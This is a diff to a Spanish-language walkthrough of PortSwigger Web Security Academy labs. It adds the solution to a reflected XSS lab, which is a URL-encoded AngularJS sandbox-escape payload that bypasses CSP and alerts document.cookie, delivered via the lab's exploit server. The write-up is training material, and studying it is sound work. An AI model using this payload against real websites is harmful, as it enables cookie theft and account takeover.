@@ -554,9 +554,29 @@ https://acb21f281e6b46ae80ce52c30094008a.web-security-academy.net/?search=1&toSt
 
 ![](img45.png)
 
-## 20. Lab: Reflected XSS with AngularJS sandbox escape and CSP
+## 20. Lab: Reflected XSS with AngularJS sandbox escape and CSP (P)
 
+```
+This lab uses CSP and AngularJS.
 
+To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie.
+```
+
+Payload
+
+```
+%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x
+```
+
+![](img46.png)
+
+Luego vamos al Exploit Server, y enviamos el siguiente payload.
+
+![](img47.png)
+
+![](img48.png)
+
+## 21. Lab: DOM XSS in document.write sink using source location.search
 
 
 
